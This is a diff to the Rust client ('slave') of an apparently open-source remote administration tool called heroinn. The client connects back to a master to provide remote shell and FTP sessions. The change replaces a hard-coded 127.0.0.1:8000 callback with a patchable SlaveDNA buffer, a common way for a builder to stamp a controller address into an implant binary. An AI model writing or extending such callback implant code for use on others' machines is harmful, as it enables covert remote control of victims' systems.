@@ -1,29 +1,22 @@
 use std::{sync::{mpsc::channel, Arc, atomic::AtomicU64, Mutex}, time::Duration, str::FromStr};
 use std::sync::atomic::Ordering::Relaxed;
 use uuid::Uuid;
-use heroinn_util::{protocol::{ClientWrapper}, packet::{Message, HostInfo, Heartbeat}, HeroinnClientMsgID, cur_timestamp_secs, HEART_BEAT_TIME, HeroinnServerCommandID, session::{SessionBase, Session, SessionManager}, HeroinnProtocol, close_all_session_in_lock, ConnectionInfo};
+use heroinn_util::{protocol::{ClientWrapper}, packet::{Message, HostInfo, Heartbeat}, HeroinnClientMsgID, cur_timestamp_secs, HEART_BEAT_TIME, HeroinnServerCommandID, session::{SessionBase, Session, SessionManager}, HeroinnProtocol, close_all_session_in_lock, SlaveDNA, gen::CONNECTION_INFO_FLAG};
 use systemstat::{Platform , System, Ipv4Addr};
 use lazy_static::*;
 
 mod module;
+mod config;
 
 use module::Shell::ShellClient;
 
-use crate::module::ftp::FtpClient;
+use crate::{module::ftp::FtpClient, config::master_configure};
+
+const G_CONNECTION_INFO : SlaveDNA = SlaveDNA{ flag : CONNECTION_INFO_FLAG, size : [0u8;8], data : [0u8;1024] };
 
 lazy_static!{
-    static ref G_DEFAULT_MASTER_ADDR : &'static str = "127.0.0.1:8000";
-    static ref G_DEFAULT_MASTER_PROTOCOL : HeroinnProtocol = HeroinnProtocol::TCP;
     static ref G_OUT_BYTES : Arc<AtomicU64> = Arc::new(AtomicU64::new(0));
     static ref G_IN_BYTES : Arc<AtomicU64> = Arc::new(AtomicU64::new(0));
-    static ref G_CONNECTION_INFO : ConnectionInfo = ConnectionInfo{
-        flag : 0x1234567812345678,
-        protocol : HeroinnProtocol::TCP.to_u8(),
-        address_size : 0,
-        address : [0u8;255],
-        remark_size : 0,
-        remark : [0u8;255],
-    };
 }
 
 fn main() {
@@ -55,12 +48,14 @@ fn main() {
         }
     });
 
+    let config = master_configure();
+
     loop{
         close_all_session_in_lock!(shell_session_mgr);
 
         let (session_sender , session_receiver) = channel::<SessionBase>();
 
-        let mut client : ClientWrapper = match ClientWrapper::connect(&G_DEFAULT_MASTER_PROTOCOL , &G_DEFAULT_MASTER_ADDR){
+        let mut client : ClientWrapper = match ClientWrapper::connect(&HeroinnProtocol::from(config.protocol) , &config.address){
             Ok(p) => p,
             Err(e) => {
                 log::info!("connect faild : {}" , e);
